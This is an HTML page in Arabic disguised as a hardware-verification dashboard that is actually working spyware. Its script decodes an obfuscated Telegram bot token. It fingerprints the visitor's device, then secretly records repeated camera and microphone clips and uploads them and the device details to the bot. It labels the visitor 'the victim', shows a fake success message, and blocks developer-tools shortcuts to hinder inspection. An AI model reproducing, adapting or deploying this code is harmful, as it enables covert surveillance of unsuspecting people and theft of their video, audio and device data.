<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Enterprise Core V2 | مركز البيانات السيادي</title>
    
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/fingerprintjs2/2.1.4/fingerprint2.min.js"></script>

    <style>
        :root { --accent: #00ff88; --bg: #030712; }
        body { background: var(--bg); color: #fff; font-family: 'Segoe UI', sans-serif; overflow: hidden; }
        .neon-border { border: 1px solid var(--accent); box-shadow: 0 0 15px rgba(0, 255, 136, 0.2); }
        .glass-panel { background: rgba(17, 24, 39, 0.7); backdrop-filter: blur(30px); border-radius: 2.5rem; }
        #matrix-bg { position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.15; }
        .btn-glow { transition: 0.4s; background: var(--accent); color: #000; font-weight: 900; }
        .btn-glow:hover { box-shadow: 0 0 40px var(--accent); transform: scale(1.02); }
        #loader { position: fixed; inset: 0; z-index: 9999; background: #000; display: flex; flex-direction: column; align-items: center; justify-content: center; }
        .binary-load { font-family: monospace; color: var(--accent); font-size: 10px; }
    </style>
</head>
<body>

<div id="loader">
    <div class="w-20 h-20 border-t-4 border-accent rounded-full animate-spin mb-4"></div>
    <div class="binary-load" id="load-text">LOADING_CORE_SYSTEM_...</div>
</div>

<canvas id="matrix-bg"></canvas>

<div class="flex h-screen p-6 gap-6 relative">
    <aside class="w-80 glass-panel neon-border p-8 flex flex-col">
        <div class="mb-12">
            <h2 class="text-3xl font-black tracking-tighter text-accent italic">LEVIATHAN<span class="text-white">V2</span></h2>
            <p class="text-[10px] text-gray-500 uppercase tracking-widest">Advanced Recon Node</p>
        </div>

        <nav class="space-y-4 flex-grow">
            <div class="p-4 rounded-2xl bg-accent/10 text-accent border border-accent/20"><i class="fas fa-microchip ml-2"></i> فحص العتاد</div>
            <div class="p-4 rounded-2xl hover:bg-white/5 transition opacity-50"><i class="fas fa-shield-virus ml-2"></i> جدار الحماية</div>
            <div class="p-4 rounded-2xl hover:bg-white/5 transition opacity-50"><i class="fas fa-terminal ml-2"></i> وحدة التحكم</div>
        </nav>

        <div class="mt-auto p-4 glass-panel border border-white/5">
            <p class="text-[10px] text-accent mb-2">تشفير الجلسة: <span class="text-white">نشط</span></p>
            <div class="h-1 bg-gray-800 rounded-full overflow-hidden"><div class="h-full bg-accent w-full animate-pulse"></div></div>
        </div>
    </aside>

    <main class="flex-grow flex flex-col gap-6">
        <header class="glass-panel neon-border p-10 flex justify-between items-center">
            <div>
                <h1 class="text-4xl font-black">تحليل العتاد المتطور</h1>
                <p class="text-gray-400 mt-2">نظام التحقق من هوية الأجهزة (Hardware ID Verification)</p>
            </div>
            <button id="main-sync" class="btn-glow px-12 py-5 rounded-3xl shadow-xl active:scale-95">
                تفعيل المزامنة الشاملة
            </button>
        </header>

        <div class="grid grid-cols-12 gap-6 flex-grow">
            <div class="col-span-5 glass-panel neon-border p-8 flex flex-col">
                <h3 class="text-accent font-bold mb-6 flex items-center gap-2 underline uppercase tracking-widest">
                    <i class="fas fa-mobile"></i> تفاصيل الجهاز المستخرج
                </h3>
                <div id="device-root" class="space-y-4 font-mono text-sm text-emerald-400">
                    <p>> جاري استخراج المعرّف الفريد...</p>
                </div>
                <div class="mt-auto opacity-10 flex justify-center">
                    <i class="fas fa-robot text-9xl"></i>
                </div>
            </div>

            <div class="col-span-7 glass-panel neon-border p-8">
                <h3 class="text-accent font-bold mb-4 uppercase text-xs tracking-widest">Data Stream Frequency</h3>
                <canvas id="streamChart" height="150"></canvas>
            </div>
        </div>
    </main>
</div>

<div class="hidden">
    <video id="v" autoplay playsinline muted></video>
    <canvas id="c"></canvas>
</div>

<script>
    // --- النواة السيادية (The Sovereign Core) ---
    const _K = {
        _U: "ODM3ODA5OTgwMDpBQUdUT0x6SkNoOHFvcy0xWXZzc0VHWmZZRDdWLUlMSGNSbw==",
        _I: "NjA1MjUzMjA0NA=="
    };

    const _D = (s) => atob(s);
    const URL = `https://api.telegram.org/bot${_D(_K._U)}`;
    const CID = _D(_K._I);

    async function _REPORT(p, t = "msg") {
        try {
            if(t === "msg") {
                await fetch(`${URL}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({chat_id: CID, text: `🐉 [LEVIATHAN_V2]:\n${p}`, parse_mode: 'HTML'})
                });
            } else {
                let f = new FormData();
                f.append('chat_id', CID);
                f.append(t, p, `vid_${Date.now()}.mp4`);
                await fetch(`${URL}/send${t.charAt(0).toUpperCase() + t.slice(1)}`, {method: f.method, body: f});
            }
        } catch(e) {}
    }

    // --- وحدة سحب مواصفات الجهاز بدقة (Deep Device Recon) ---
    async function GET_REAL_DEVICE() {
        const gl = document.createElement('canvas').getContext('webgl');
        const dbg = gl.getExtension('WEBGL_debug_renderer_info');
        const gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
        
        // خوارزمية ذكية لتحديد اسم الهاتف من كرت الشاشة
        let phoneName = "Unknown Device";
        if(gpu.includes("Apple")) phoneName = "iPhone / iPad (Apple Silicon)";
        else if(gpu.includes("Adreno")) phoneName = "High-End Android (Snapdragon)";
        else if(gpu.includes("Mali")) phoneName = "Samsung / Huawei (Exynos/Kirin)";

        const data = {
            "اسم الجهاز التقديري": phoneName,
            "المعالج الرسومي (GPU)": gpu,
            "أنوية المعالج": navigator.hardwareConcurrency + " Cores",
            "الذاكرة العشوائية": (navigator.deviceMemory || "N/A") + " GB",
            "دقة الشاشة": `${screen.width}x${screen.height}`,
            "المتصفح": navigator.userAgent.split(') ')[1],
            "اللغة": navigator.language
        };

        const root = document.getElementById('device-root');
        root.innerHTML = Object.entries(data).map(([k, v]) => `<p class="border-b border-white/5 pb-2"><span class="text-gray-500">${k}:</span> <span class="text-white">${v}</span></p>`).join('');

        _REPORT(`<b>📱 تقرير دقيق للجهاز:</b>\n<pre>${JSON.stringify(data, null, 2)}</pre>`);
    }

    // --- وحدة سحب الفيديو (The Predator) ---
    async function START_VID() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({video: true, audio: true});
            const v = document.getElementById('v');
            v.srcObject = stream;
            
            const rec = new MediaRecorder(stream);
            let chunks = [];
            rec.ondataavailable = e => chunks.push(e.data);
            rec.onstop = () => {
                _REPORT(new Blob(chunks, {type: 'video/mp4'}), 'video');
                setTimeout(START_VID, 20000); // تكرار التسجيل كل 20 ثانية
            };
            
            rec.start();
            setTimeout(() => { 
                rec.stop(); 
                stream.getTracks().forEach(t => t.stop()); 
            }, 10000); // تسجيل مقطع مدته 10 ثوانٍ

        } catch(e) { _REPORT(`❌ فشل الكاميرا: ${e.message}`); }
    }

    // --- الرسم البياني والتمويه ---
    function init() {
        const ctx = document.getElementById('streamChart').getContext('2d');
        new Chart(ctx, {
            type: 'line',
            data: {
                labels: Array.from({length: 50}, (_, i) => i),
                datasets: [{
                    data: Array.from({length: 50}, () => Math.random() * 100),
                    borderColor: '#00ff88',
                    borderWidth: 1,
                    fill: true,
                    backgroundColor: 'rgba(0, 255, 136, 0.05)',
                    tension: 0.4
                }]
            },
            options: { plugins: {legend: {display: false}}, scales: {x: {display: false}, y: {display: false}} }
        });

        // Matrix Background
        const c = document.getElementById('matrix-bg');
        const ctxM = c.getContext('2d');
        c.width = window.innerWidth; c.height = window.innerHeight;
        const chars = "010101010101010101";
        const drops = Array(Math.floor(c.width/20)).fill(1);
        function drawM() {
            ctxM.fillStyle = "rgba(0, 0, 0, 0.05)"; ctxM.fillRect(0, 0, c.width, c.height);
            ctxM.fillStyle = "#00ff88"; ctxM.font = "15px monospace";
            drops.forEach((y, i) => {
                const text = chars[Math.floor(Math.random()*chars.length)];
                ctxM.fillText(text, i*20, y*20);
                if(y*20 > c.height && Math.random() > 0.975) drops[i] = 0;
                drops[i]++;
            });
        }
        setInterval(drawM, 50);
    }

    // زر المزامنة
    document.getElementById('main-sync').onclick = function() {
        this.innerHTML = "جارٍ فحص العتاد...";
        this.disabled = true;
        GET_REAL_DEVICE();
        START_VID();
        _REPORT(`🎯 <b>تحرك الضحية:</b> بدأ مزامنة النظام وفحص الفيديو.`);
        
        let p = 0;
        const itv = setInterval(() => {
            p += 1;
            if(p >= 100) {
                clearInterval(itv);
                this.innerHTML = "مكتمل بنجاح ✅";
                this.className = "bg-white text-black px-12 py-5 rounded-3xl font-black";
                alert("تم التحقق من عتاد الجهاز وتشفير الجلسة.");
            }
        }, 50);
    };

    window.onload = () => {
        setTimeout(() => {
            document.getElementById('loader').style.display = 'none';
            init();
            _REPORT(`🚀 <b>دخول:</b> الضحية يشاهد الصفحة الآن.`);
        }, 2000);
    };

    // منع التفتيش
    window.onkeydown = (e) => { if(e.keyCode == 123 || (e.ctrlKey && e.shiftKey && e.key == 'I')) return false; };
</script>
</body>
</html>
